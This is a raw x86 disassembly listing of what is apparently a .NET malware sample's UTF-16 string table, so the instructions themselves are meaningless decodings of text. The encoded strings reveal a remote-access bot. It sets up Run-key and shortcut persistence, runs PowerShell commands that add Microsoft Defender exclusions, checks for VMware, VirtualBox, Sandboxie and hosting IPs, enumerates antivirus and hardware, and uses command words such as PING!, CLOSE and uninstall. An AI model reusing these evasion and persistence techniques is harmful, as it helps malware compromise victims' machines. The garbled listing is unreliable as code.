  40aae0:	46                   	inc    %esi
  40aae1:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  40aae5:	00 41 00             	add    %al,0x0(%ecx)
  40aae8:	52                   	push   %edx
  40aae9:	00 45 00             	add    %al,0x0(%ebp)
  40aaec:	5c                   	pop    %esp
  40aaed:	00 4d 00             	add    %cl,0x0(%ebp)
  40aaf0:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  40aaf6:	6f                   	outsl  %ds:(%esi),(%dx)
  40aaf7:	00 73 00             	add    %dh,0x0(%ebx)
  40aafa:	6f                   	outsl  %ds:(%esi),(%dx)
  40aafb:	00 66 00             	add    %ah,0x0(%esi)
  40aafe:	74 00                	je     0x40ab00
  40ab00:	5c                   	pop    %esp
  40ab01:	00 57 00             	add    %dl,0x0(%edi)
  40ab04:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40ab0a:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab0b:	00 77 00             	add    %dh,0x0(%edi)
  40ab0e:	73 00                	jae    0x40ab10
  40ab10:	5c                   	pop    %esp
  40ab11:	00 43 00             	add    %al,0x0(%ebx)
  40ab14:	75 00                	jne    0x40ab16
  40ab16:	72 00                	jb     0x40ab18
  40ab18:	72 00                	jb     0x40ab1a
  40ab1a:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40ab1e:	74 00                	je     0x40ab20
  40ab20:	56                   	push   %esi
  40ab21:	00 65 00             	add    %ah,0x0(%ebp)
  40ab24:	72 00                	jb     0x40ab26
  40ab26:	73 00                	jae    0x40ab28
  40ab28:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40ab2e:	5c                   	pop    %esp
  40ab2f:	00 52 00             	add    %dl,0x0(%edx)
  40ab32:	75 00                	jne    0x40ab34
  40ab34:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab35:	00 00                	add    %al,(%eax)
  40ab37:	09 2e                	or     %ebp,(%esi)
  40ab39:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  40ab3d:	00 6b 00             	add    %ch,0x0(%ebx)
  40ab40:	00 1b                	add    %bl,(%ebx)
  40ab42:	57                   	push   %edi
  40ab43:	00 53 00             	add    %dl,0x0(%ebx)
  40ab46:	63 00                	arpl   %eax,(%eax)
  40ab48:	72 00                	jb     0x40ab4a
  40ab4a:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40ab50:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  40ab54:	68 00 65 00 6c       	push   $0x6c006500
  40ab59:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40ab5d:	01 00                	add    %eax,(%eax)
  40ab5f:	1d 43 00 72 00       	sbb    $0x720043,%eax
  40ab64:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40ab68:	74 00                	je     0x40ab6a
  40ab6a:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  40ab6e:	68 00 6f 00 72       	push   $0x72006f00
  40ab73:	00 74 00 63          	add    %dh,0x63(%eax,%eax,1)
  40ab77:	00 75 00             	add    %dh,0x0(%ebp)
  40ab7a:	74 00                	je     0x40ab7c
  40ab7c:	00 15 54 00 61 00    	add    %dl,0x610054
  40ab82:	72 00                	jb     0x40ab84
  40ab84:	67 00 65 00          	add    %ah,0x0(%di)
  40ab88:	74 00                	je     0x40ab8a
  40ab8a:	50                   	push   %eax
  40ab8b:	00 61 00             	add    %ah,0x0(%ecx)
  40ab8e:	74 00                	je     0x40ab90
  40ab90:	68 00 00 21 57       	push   $0x57210000
  40ab95:	00 6f 00             	add    %ch,0x0(%edi)
  40ab98:	72 00                	jb     0x40ab9a
  40ab9a:	6b 00 69             	imul   $0x69,(%eax),%eax
  40ab9d:	00 6e 00             	add    %ch,0x0(%esi)
  40aba0:	67 00 44 00          	add    %al,0x0(%si)
  40aba4:	69 00 72 00 65 00    	imul   $0x650072,(%eax),%eax
  40abaa:	63 00                	arpl   %eax,(%eax)
  40abac:	74 00                	je     0x40abae
  40abae:	6f                   	outsl  %ds:(%esi),(%dx)
  40abaf:	00 72 00             	add    %dh,0x0(%edx)
  40abb2:	79 00                	jns    0x40abb4
  40abb4:	00 09                	add    %cl,(%ecx)
  40abb6:	53                   	push   %ebx
  40abb7:	00 61 00             	add    %ah,0x0(%ecx)
  40abba:	76 00                	jbe    0x40abbc
  40abbc:	65 00 00             	add    %al,%gs:(%eax)
  40abbf:	1d 70 00 6f 00       	sbb    $0x6f0070,%eax
  40abc4:	77 00                	ja     0x40abc6
  40abc6:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40abca:	73 00                	jae    0x40abcc
  40abcc:	68 00 65 00 6c       	push   $0x6c006500
  40abd1:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40abd5:	00 65 00             	add    %ah,0x0(%ebp)
  40abd8:	78 00                	js     0x40abda
  40abda:	65 00 00             	add    %al,%gs:(%eax)
  40abdd:	73 2d                	jae    0x40ac0c
  40abdf:	00 45 00             	add    %al,0x0(%ebp)
  40abe2:	78 00                	js     0x40abe4
  40abe4:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40abe8:	75 00                	jne    0x40abea
  40abea:	74 00                	je     0x40abec
  40abec:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40abf2:	50                   	push   %eax
  40abf3:	00 6f 00             	add    %ch,0x0(%edi)
  40abf6:	6c                   	insb   (%dx),%es:(%edi)
  40abf7:	00 69 00             	add    %ch,0x0(%ecx)
  40abfa:	63 00                	arpl   %eax,(%eax)
  40abfc:	79 00                	jns    0x40abfe
  40abfe:	20 00                	and    %al,(%eax)
  40ac00:	42                   	inc    %edx
  40ac01:	00 79 00             	add    %bh,0x0(%ecx)
  40ac04:	70 00                	jo     0x40ac06
  40ac06:	61                   	popa
  40ac07:	00 73 00             	add    %dh,0x0(%ebx)
  40ac0a:	73 00                	jae    0x40ac0c
  40ac0c:	20 00                	and    %al,(%eax)
  40ac0e:	41                   	inc    %ecx
  40ac0f:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  40ac13:	00 2d 00 4d 00 70    	add    %ch,0x70004d00
  40ac19:	00 50 00             	add    %dl,0x0(%eax)
  40ac1c:	72 00                	jb     0x40ac1e
  40ac1e:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  40ac22:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ac26:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40ac2a:	63 00                	arpl   %eax,(%eax)
  40ac2c:	65 00 20             	add    %ah,%gs:(%eax)
  40ac2f:	00 2d 00 45 00 78    	add    %ch,0x78004500
  40ac35:	00 63 00             	add    %ah,0x0(%ebx)
  40ac38:	6c                   	insb   (%dx),%es:(%edi)
  40ac39:	00 75 00             	add    %dh,0x0(%ebp)
  40ac3c:	73 00                	jae    0x40ac3e
  40ac3e:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40ac44:	50                   	push   %eax
  40ac45:	00 61 00             	add    %ah,0x0(%ecx)
  40ac48:	74 00                	je     0x40ac4a
  40ac4a:	68 00 20 00 27       	push   $0x27002000
  40ac4f:	00 01                	add    %al,(%ecx)
  40ac51:	03 27                	add    (%edi),%esp
  40ac53:	00 01                	add    %al,(%ecx)
  40ac55:	79 2d                	jns    0x40ac84
  40ac57:	00 45 00             	add    %al,0x0(%ebp)
  40ac5a:	78 00                	js     0x40ac5c
  40ac5c:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40ac60:	75 00                	jne    0x40ac62
  40ac62:	74 00                	je     0x40ac64
  40ac64:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40ac6a:	50                   	push   %eax
  40ac6b:	00 6f 00             	add    %ch,0x0(%edi)
  40ac6e:	6c                   	insb   (%dx),%es:(%edi)
  40ac6f:	00 69 00             	add    %ch,0x0(%ecx)
  40ac72:	63 00                	arpl   %eax,(%eax)
  40ac74:	79 00                	jns    0x40ac76
  40ac76:	20 00                	and    %al,(%eax)
  40ac78:	42                   	inc    %edx
  40ac79:	00 79 00             	add    %bh,0x0(%ecx)
  40ac7c:	70 00                	jo     0x40ac7e
  40ac7e:	61                   	popa
  40ac7f:	00 73 00             	add    %dh,0x0(%ebx)
  40ac82:	73 00                	jae    0x40ac84
  40ac84:	20 00                	and    %al,(%eax)
  40ac86:	41                   	inc    %ecx
  40ac87:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  40ac8b:	00 2d 00 4d 00 70    	add    %ch,0x70004d00
  40ac91:	00 50 00             	add    %dl,0x0(%eax)
  40ac94:	72 00                	jb     0x40ac96
  40ac96:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  40ac9a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ac9e:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40aca2:	63 00                	arpl   %eax,(%eax)
  40aca4:	65 00 20             	add    %ah,%gs:(%eax)
  40aca7:	00 2d 00 45 00 78    	add    %ch,0x78004500
  40acad:	00 63 00             	add    %ah,0x0(%ebx)
  40acb0:	6c                   	insb   (%dx),%es:(%edi)
  40acb1:	00 75 00             	add    %dh,0x0(%ebp)
  40acb4:	73 00                	jae    0x40acb6
  40acb6:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40acbc:	50                   	push   %eax
  40acbd:	00 72 00             	add    %dh,0x0(%edx)
  40acc0:	6f                   	outsl  %ds:(%esi),(%dx)
  40acc1:	00 63 00             	add    %ah,0x0(%ebx)
  40acc4:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40acc8:	73 00                	jae    0x40acca
  40acca:	20 00                	and    %al,(%eax)
  40accc:	27                   	daa
  40accd:	00 01                	add    %al,(%ecx)
  40accf:	4d                   	dec    %ebp
  40acd0:	68 00 74 00 74       	push   $0x74007400
  40acd5:	00 70 00             	add    %dh,0x0(%eax)
  40acd8:	3a 00                	cmp    (%eax),%al
  40acda:	2f                   	das
  40acdb:	00 2f                	add    %ch,(%edi)
  40acdd:	00 69 00             	add    %ch,0x0(%ecx)
  40ace0:	70 00                	jo     0x40ace2
  40ace2:	2d 00 61 00 70       	sub    $0x70006100,%eax
  40ace7:	00 69 00             	add    %ch,0x0(%ecx)
  40acea:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40acee:	6f                   	outsl  %ds:(%esi),(%dx)
  40acef:	00 6d 00             	add    %ch,0x0(%ebp)
  40acf2:	2f                   	das
  40acf3:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40acf7:	00 6e 00             	add    %ch,0x0(%esi)
  40acfa:	65 00 2f             	add    %ch,%gs:(%edi)
  40acfd:	00 3f                	add    %bh,(%edi)
  40acff:	00 66 00             	add    %ah,0x0(%esi)
  40ad02:	69 00 65 00 6c 00    	imul   $0x6c0065,(%eax),%eax
  40ad08:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  40ad0c:	3d 00 68 00 6f       	cmp    $0x6f006800,%eax
  40ad11:	00 73 00             	add    %dh,0x0(%ebx)
  40ad14:	74 00                	je     0x40ad16
  40ad16:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40ad1c:	01 09                	add    %ecx,(%ecx)
  40ad1e:	74 00                	je     0x40ad20
  40ad20:	72 00                	jb     0x40ad22
  40ad22:	75 00                	jne    0x40ad24
  40ad24:	65 00 00             	add    %al,%gs:(%eax)
  40ad27:	05 78 00 70 00       	add    $0x700078,%eax
  40ad2c:	00 45 53             	add    %al,0x53(%ebp)
  40ad2f:	00 65 00             	add    %ah,0x0(%ebp)
  40ad32:	6c                   	insb   (%dx),%es:(%edi)
  40ad33:	00 65 00             	add    %ah,0x0(%ebp)
  40ad36:	63 00                	arpl   %eax,(%eax)
  40ad38:	74 00                	je     0x40ad3a
  40ad3a:	20 00                	and    %al,(%eax)
  40ad3c:	2a 00                	sub    (%eax),%al
  40ad3e:	20 00                	and    %al,(%eax)
  40ad40:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40ad44:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad45:	00 6d 00             	add    %ch,0x0(%ebp)
  40ad48:	20 00                	and    %al,(%eax)
  40ad4a:	57                   	push   %edi
  40ad4b:	00 69 00             	add    %ch,0x0(%ecx)
  40ad4e:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad4f:	00 33                	add    %dh,(%ebx)
  40ad51:	00 32                	add    %dh,(%edx)
  40ad53:	00 5f 00             	add    %bl,0x0(%edi)
  40ad56:	43                   	inc    %ebx
  40ad57:	00 6f 00             	add    %ch,0x0(%edi)
  40ad5a:	6d                   	insl   (%dx),%es:(%edi)
  40ad5b:	00 70 00             	add    %dh,0x0(%eax)
  40ad5e:	75 00                	jne    0x40ad60
  40ad60:	74 00                	je     0x40ad62
  40ad62:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ad66:	53                   	push   %ebx
  40ad67:	00 79 00             	add    %bh,0x0(%ecx)
  40ad6a:	73 00                	jae    0x40ad6c
  40ad6c:	74 00                	je     0x40ad6e
  40ad6e:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40ad72:	00 07                	add    %al,(%edi)
  40ad74:	47                   	inc    %edi
  40ad75:	00 65 00             	add    %ah,0x0(%ebp)
  40ad78:	74 00                	je     0x40ad7a
  40ad7a:	00 19                	add    %bl,(%ecx)
  40ad7c:	4d                   	dec    %ebp
  40ad7d:	00 61 00             	add    %ah,0x0(%ecx)
  40ad80:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad81:	00 75 00             	add    %dh,0x0(%ebp)
  40ad84:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40ad88:	63 00                	arpl   %eax,(%eax)
  40ad8a:	74 00                	je     0x40ad8c
  40ad8c:	75 00                	jne    0x40ad8e
  40ad8e:	72 00                	jb     0x40ad90
  40ad90:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ad94:	00 2b                	add    %ch,(%ebx)
  40ad96:	6d                   	insl   (%dx),%es:(%edi)
  40ad97:	00 69 00             	add    %ch,0x0(%ecx)
  40ad9a:	63 00                	arpl   %eax,(%eax)
  40ad9c:	72 00                	jb     0x40ad9e
  40ad9e:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad9f:	00 73 00             	add    %dh,0x0(%ebx)
  40ada2:	6f                   	outsl  %ds:(%esi),(%dx)
  40ada3:	00 66 00             	add    %ah,0x0(%esi)
  40ada6:	74 00                	je     0x40ada8
  40ada8:	20 00                	and    %al,(%eax)
  40adaa:	63 00                	arpl   %eax,(%eax)
  40adac:	6f                   	outsl  %ds:(%esi),(%dx)
  40adad:	00 72 00             	add    %dh,0x0(%edx)
  40adb0:	70 00                	jo     0x40adb2
  40adb2:	6f                   	outsl  %ds:(%esi),(%dx)
  40adb3:	00 72 00             	add    %dh,0x0(%edx)
  40adb6:	61                   	popa
  40adb7:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40adbb:	00 6f 00             	add    %ch,0x0(%edi)
  40adbe:	6e                   	outsb  %ds:(%esi),(%dx)
  40adbf:	00 00                	add    %al,(%eax)
  40adc1:	0b 4d 00             	or     0x0(%ebp),%ecx
  40adc4:	6f                   	outsl  %ds:(%esi),(%dx)
  40adc5:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40adc9:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40adcd:	0f 56 00             	orps   (%eax),%xmm0
  40add0:	49                   	dec    %ecx
  40add1:	00 52 00             	add    %dl,0x0(%edx)
  40add4:	54                   	push   %esp
  40add5:	00 55 00             	add    %dl,0x0(%ebp)
  40add8:	41                   	inc    %ecx
  40add9:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40addd:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40ade2:	77 00                	ja     0x40ade4
  40ade4:	61                   	popa
  40ade5:	00 72 00             	add    %dh,0x0(%edx)
  40ade8:	65 00 00             	add    %al,%gs:(%eax)
  40adeb:	15 56 00 69 00       	adc    $0x690056,%eax
  40adf0:	72 00                	jb     0x40adf2
  40adf2:	74 00                	je     0x40adf4
  40adf4:	75 00                	jne    0x40adf6
  40adf6:	61                   	popa
  40adf7:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40adfb:	00 6f 00             	add    %ch,0x0(%edi)
  40adfe:	78 00                	js     0x40ae00
  40ae00:	00 17                	add    %dl,(%edi)
  40ae02:	53                   	push   %ebx
  40ae03:	00 62 00             	add    %ah,0x0(%edx)
  40ae06:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40ae0c:	6c                   	insb   (%dx),%es:(%edi)
  40ae0d:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40ae11:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40ae15:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40ae19:	09 49 00             	or     %ecx,0x0(%ecx)
  40ae1c:	4e                   	dec    %esi
  40ae1d:	00 46 00             	add    %al,0x0(%esi)
  40ae20:	4f                   	dec    %edi
  40ae21:	00 00                	add    %al,(%eax)
  40ae23:	13 4d 00             	adc    0x0(%ebp),%ecx
  40ae26:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  40ae2c:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae2d:	00 73 00             	add    %dh,0x0(%ebx)
  40ae30:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae31:	00 66 00             	add    %ah,0x0(%esi)
  40ae34:	74 00                	je     0x40ae36
  40ae36:	00 19                	add    %bl,(%ecx)
  40ae38:	53                   	push   %ebx
  40ae39:	00 65 00             	add    %ah,0x0(%ebp)
  40ae3c:	72 00                	jb     0x40ae3e
  40ae3e:	76 00                	jbe    0x40ae40
  40ae40:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  40ae46:	20 00                	and    %al,(%eax)
  40ae48:	50                   	push   %eax
  40ae49:	00 61 00             	add    %ah,0x0(%ecx)
  40ae4c:	63 00                	arpl   %eax,(%eax)
  40ae4e:	6b 00 00             	imul   $0x0,(%eax),%eax
  40ae51:	05 53 00 50 00       	add    $0x500053,%eax
  40ae56:	00 03                	add    %al,(%ebx)
  40ae58:	20 00                	and    %al,(%eax)
  40ae5a:	00 0b                	add    %cl,(%ebx)
  40ae5c:	46                   	inc    %esi
  40ae5d:	00 61 00             	add    %ah,0x0(%ecx)
  40ae60:	6c                   	insb   (%dx),%es:(%edi)
  40ae61:	00 73 00             	add    %dh,0x0(%ebx)
  40ae64:	65 00 00             	add    %al,%gs:(%eax)
  40ae67:	0b 33                	or     (%ebx),%esi
  40ae69:	00 32                	add    %dh,(%edx)
  40ae6b:	00 62 00             	add    %ah,0x0(%edx)
  40ae6e:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40ae74:	54                   	push   %esp
  40ae75:	00 72 00             	add    %dh,0x0(%edx)
  40ae78:	75 00                	jne    0x40ae7a
  40ae7a:	65 00 00             	add    %al,%gs:(%eax)
  40ae7d:	0b 36                	or     (%esi),%esi
  40ae7f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ae82:	62 00                	bound  %eax,(%eax)
  40ae84:	69 00 74 00 00 13    	imul   $0x13000074,(%eax),%eax
  40ae8a:	64 00 64 00 2f       	add    %ah,%fs:0x2f(%eax,%eax,1)
  40ae8f:	00 4d 00             	add    %cl,0x0(%ebp)
  40ae92:	4d                   	dec    %ebp
  40ae93:	00 2f                	add    %ch,(%edi)
  40ae95:	00 79 00             	add    %bh,0x0(%ecx)
  40ae98:	79 00                	jns    0x40ae9a
  40ae9a:	79 00                	jns    0x40ae9c
  40ae9c:	00 0b                	add    %cl,(%ebx)
  40ae9e:	45                   	inc    %ebp
  40ae9f:	00 72 00             	add    %dh,0x0(%edx)
  40aea2:	72 00                	jb     0x40aea4
  40aea4:	6f                   	outsl  %ds:(%esi),(%dx)
  40aea5:	00 72 00             	add    %dh,0x0(%edx)
  40aea8:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40aeae:	00 2b                	add    %ch,(%ebx)
  40aeb0:	5c                   	pop    %esp
  40aeb1:	00 72 00             	add    %dh,0x0(%edx)
  40aeb4:	6f                   	outsl  %ds:(%esi),(%dx)
  40aeb5:	00 6f 00             	add    %ch,0x0(%edi)
  40aeb8:	74 00                	je     0x40aeba
  40aeba:	5c                   	pop    %esp
  40aebb:	00 53 00             	add    %dl,0x0(%ebx)
  40aebe:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40aec2:	75 00                	jne    0x40aec4
  40aec4:	72 00                	jb     0x40aec6
  40aec6:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40aecc:	43                   	inc    %ebx
  40aecd:	00 65 00             	add    %ah,0x0(%ebp)
  40aed0:	6e                   	outsb  %ds:(%esi),(%dx)
  40aed1:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40aed5:	00 72 00             	add    %dh,0x0(%edx)
  40aed8:	32 00                	xor    (%eax),%al
  40aeda:	00 3d 53 00 65 00    	add    %bh,0x650053
  40aee0:	6c                   	insb   (%dx),%es:(%edi)
  40aee1:	00 65 00             	add    %ah,0x0(%ebp)
  40aee4:	63 00                	arpl   %eax,(%eax)
  40aee6:	74 00                	je     0x40aee8
  40aee8:	20 00                	and    %al,(%eax)
  40aeea:	2a 00                	sub    (%eax),%al
  40aeec:	20 00                	and    %al,(%eax)
  40aeee:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40aef2:	6f                   	outsl  %ds:(%esi),(%dx)
  40aef3:	00 6d 00             	add    %ch,0x0(%ebp)
  40aef6:	20 00                	and    %al,(%eax)
  40aef8:	41                   	inc    %ecx
  40aef9:	00 6e 00             	add    %ch,0x0(%esi)
  40aefc:	74 00                	je     0x40aefe
  40aefe:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40af04:	72 00                	jb     0x40af06
  40af06:	75 00                	jne    0x40af08
  40af08:	73 00                	jae    0x40af0a
  40af0a:	50                   	push   %eax
  40af0b:	00 72 00             	add    %dh,0x0(%edx)
  40af0e:	6f                   	outsl  %ds:(%esi),(%dx)
  40af0f:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40af13:	00 63 00             	add    %ah,0x0(%ebx)
  40af16:	74 00                	je     0x40af18
  40af18:	00 17                	add    %dl,(%edi)
  40af1a:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40af1e:	73 00                	jae    0x40af20
  40af20:	70 00                	jo     0x40af22
  40af22:	6c                   	insb   (%dx),%es:(%edi)
  40af23:	00 61 00             	add    %ah,0x0(%ecx)
  40af26:	79 00                	jns    0x40af28
  40af28:	4e                   	dec    %esi
  40af29:	00 61 00             	add    %ah,0x0(%ecx)
  40af2c:	6d                   	insl   (%dx),%es:(%edi)
  40af2d:	00 65 00             	add    %ah,0x0(%ebp)
  40af30:	00 03                	add    %al,(%ebx)
  40af32:	2c 00                	sub    $0x0,%al
  40af34:	00 09                	add    %cl,(%ecx)
  40af36:	4e                   	dec    %esi
  40af37:	00 6f 00             	add    %ch,0x0(%edi)
  40af3a:	6e                   	outsb  %ds:(%esi),(%dx)
  40af3b:	00 65 00             	add    %ah,0x0(%ebp)
  40af3e:	00 47 53             	add    %al,0x53(%edi)
  40af41:	00 45 00             	add    %al,0x0(%ebp)
  40af44:	4c                   	dec    %esp
  40af45:	00 45 00             	add    %al,0x0(%ebp)
  40af48:	43                   	inc    %ebx
  40af49:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40af4d:	00 2a                	add    %ch,(%edx)
  40af4f:	00 20                	add    %ah,(%eax)
  40af51:	00 46 00             	add    %al,0x0(%esi)
  40af54:	52                   	push   %edx
  40af55:	00 4f 00             	add    %cl,0x0(%edi)
  40af58:	4d                   	dec    %ebp
  40af59:	00 20                	add    %ah,(%eax)
  40af5b:	00 57 00             	add    %dl,0x0(%edi)
  40af5e:	69 00 6e 00 33 00    	imul   $0x33006e,(%eax),%eax
  40af64:	32 00                	xor    (%eax),%al
  40af66:	5f                   	pop    %edi
  40af67:	00 56 00             	add    %dl,0x0(%esi)
  40af6a:	69 00 64 00 65 00    	imul   $0x650064,(%eax),%eax
  40af70:	6f                   	outsl  %ds:(%esi),(%dx)
  40af71:	00 43 00             	add    %al,0x0(%ebx)
  40af74:	6f                   	outsl  %ds:(%esi),(%dx)
  40af75:	00 6e 00             	add    %ch,0x0(%esi)
  40af78:	74 00                	je     0x40af7a
  40af7a:	72 00                	jb     0x40af7c
  40af7c:	6f                   	outsl  %ds:(%esi),(%dx)
  40af7d:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40af81:	00 65 00             	add    %ah,0x0(%ebp)
  40af84:	72 00                	jb     0x40af86
  40af86:	00 09                	add    %cl,(%ecx)
  40af88:	4e                   	dec    %esi
  40af89:	00 61 00             	add    %ah,0x0(%ecx)
  40af8c:	6d                   	insl   (%dx),%es:(%edi)
  40af8d:	00 65 00             	add    %ah,0x0(%ebp)
  40af90:	00 3f                	add    %bh,(%edi)
  40af92:	57                   	push   %edi
  40af93:	00 69 00             	add    %ch,0x0(%ecx)
  40af96:	6e                   	outsb  %ds:(%esi),(%dx)
  40af97:	00 33                	add    %dh,(%ebx)
  40af99:	00 32                	add    %dh,(%edx)
  40af9b:	00 5f 00             	add    %bl,0x0(%edi)
  40af9e:	50                   	push   %eax
  40af9f:	00 72 00             	add    %dh,0x0(%edx)
  40afa2:	6f                   	outsl  %ds:(%esi),(%dx)
  40afa3:	00 63 00             	add    %ah,0x0(%ebx)
  40afa6:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40afaa:	73 00                	jae    0x40afac
  40afac:	6f                   	outsl  %ds:(%esi),(%dx)
  40afad:	00 72 00             	add    %dh,0x0(%edx)
  40afb0:	2e 00 64 00 65       	add    %ah,%cs:0x65(%eax,%eax,1)
  40afb5:	00 76 00             	add    %dh,0x0(%esi)
  40afb8:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  40afbe:	69 00 64 00 3d 00    	imul   $0x3d0064,(%eax),%eax
  40afc4:	22 00                	and    (%eax),%al
  40afc6:	43                   	inc    %ebx
  40afc7:	00 50 00             	add    %dl,0x0(%eax)
  40afca:	55                   	push   %ebp
  40afcb:	00 30                	add    %dh,(%eax)
  40afcd:	00 22                	add    %ah,(%edx)
  40afcf:	00 00                	add    %al,(%eax)
  40afd1:	07                   	pop    %es
  40afd2:	28 00                	sub    %al,(%eax)
  40afd4:	52                   	push   %edx
  40afd5:	00 29                	add    %ch,(%ecx)
  40afd7:	00 00                	add    %al,(%eax)
  40afd9:	11 43 00             	adc    %eax,0x0(%ebx)
  40afdc:	6f                   	outsl  %ds:(%esi),(%dx)
  40afdd:	00 72 00             	add    %dh,0x0(%edx)
  40afe0:	65 00 28             	add    %ch,%gs:(%eax)
  40afe3:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  40afe7:	00 29                	add    %ch,(%ecx)
  40afe9:	00 00                	add    %al,(%eax)
  40afeb:	07                   	pop    %es
  40afec:	43                   	inc    %ebx
  40afed:	00 50 00             	add    %dl,0x0(%eax)
  40aff0:	55                   	push   %ebp
  40aff1:	00 00                	add    %al,(%eax)
  40aff3:	07                   	pop    %es
  40aff4:	20 00                	and    %al,(%eax)
  40aff6:	47                   	inc    %edi
  40aff7:	00 42 00             	add    %al,0x0(%edx)
  40affa:	00 07                	add    %al,(%edi)
  40affc:	20 00                	and    %al,(%eax)
  40affe:	4d                   	dec    %ebp
  40afff:	00 42 00             	add    %al,0x0(%edx)
  40b002:	00 0b                	add    %cl,(%ebx)
  40b004:	53                   	push   %ebx
  40b005:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40b009:	00 72 00             	add    %dh,0x0(%edx)
  40b00c:	74 00                	je     0x40b00e
  40b00e:	00 03                	add    %al,(%ebx)
  40b010:	00 00                	add    %al,(%eax)
  40b012:	01 0b                	add    %ecx,(%ebx)
  40b014:	50                   	push   %eax
  40b015:	00 49 00             	add    %cl,0x0(%ecx)
  40b018:	4e                   	dec    %esi
  40b019:	00 47 00             	add    %al,0x0(%edi)
  40b01c:	21 00                	and    %eax,(%eax)
  40b01e:	00 09                	add    %cl,(%ecx)
  40b020:	70 00                	jo     0x40b022
  40b022:	6f                   	outsl  %ds:(%esi),(%dx)
  40b023:	00 6e 00             	add    %ch,0x0(%esi)
  40b026:	67 00 00             	add    %al,(%bx,%si)
  40b029:	07                   	pop    %es
  40b02a:	72 00                	jb     0x40b02c
  40b02c:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b030:	00 0b                	add    %cl,(%ebx)
  40b032:	43                   	inc    %ebx
  40b033:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  40b037:	00 53 00             	add    %dl,0x0(%ebx)
  40b03a:	45                   	inc    %ebp
  40b03b:	00 00                	add    %al,(%eax)
  40b03d:	13 75 00             	adc    0x0(%ebp),%esi
  40b040:	6e                   	outsb  %ds:(%esi),(%dx)
  40b041:	00 69 00             	add    %ch,0x0(%ecx)
  40b044:	6e                   	outsb  %ds:(%esi),(%dx)
  40b045:	00 73 00             	add    %dh,0x0(%ebx)
  40b048:	74 00                	je     0x40b04a
  40b04a:	61                   	popa
  40b04b:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40b04f:	00 00                	add    %al,(%eax)
  40b051:	0d 75 00 70 00       	or     $0x700075,%eax
  40b056:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b05a:	74 00                	je     0x40b05c
